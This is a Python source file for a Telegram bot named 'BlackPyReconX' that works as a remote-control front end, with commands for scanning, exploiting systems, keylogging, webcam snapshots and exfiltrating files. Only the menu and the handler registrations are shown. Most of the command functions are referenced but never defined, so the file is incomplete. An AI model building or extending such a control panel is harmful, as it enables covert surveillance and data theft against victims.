# telegram_bot/telegram_bot.py

import os
from pathlib import Path
from flask import Flask, request
from telegram import Update
from telegram.ext import (
    CommandHandler, ContextTypes, Application
)
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

from modules.utils import get_api_keys

# === 🔐 Clés API
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# === 📁 Répertoires
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"

# === 📲 Flask App (exigé par Render)
app = Flask(__name__)  # 🔥 LIGNE CRUCIALE

# === 📲 Telegram Application
application: Application = Application.builder().token(TOKEN).build()

# === 🧩 Handlers
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n",
        parse_mode=ParseMode.MARKDOWN
    )

# 🧩 Toutes les autres commandes que tu avais déjà
# (osint, scan, exploit_sys, screenshot, etc.)
# 👇 On les ajoute ici :
application.add_handler(CommandHandler("menu", menu))
application.add_handler(CommandHandler("osint", osint))
application.add_handler(CommandHandler("scan", scan))
application.add_handler(CommandHandler("exploit_sys", exploit_sys))
application.add_handler(CommandHandler("screenshot", screenshot))
application.add_handler(CommandHandler("keylogger_start", keylogger_start))
application.add_handler(CommandHandler("webcam_snap", webcam_snap))
application.add_handler(CommandHandler("exfiltrate", exfiltrate))
application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
application.add_handler(CommandHandler("rapport", rapport))

# === 🔁 Webhook entrypoint Flask
@app.post("/telegram/webhook")
async def telegram_webhook():
    if request.method == "POST":
        data = request.get_json(force=True)
        update = Update.de_json(data, application.bot)
        await application.process_update(update)
    return "OK", 200
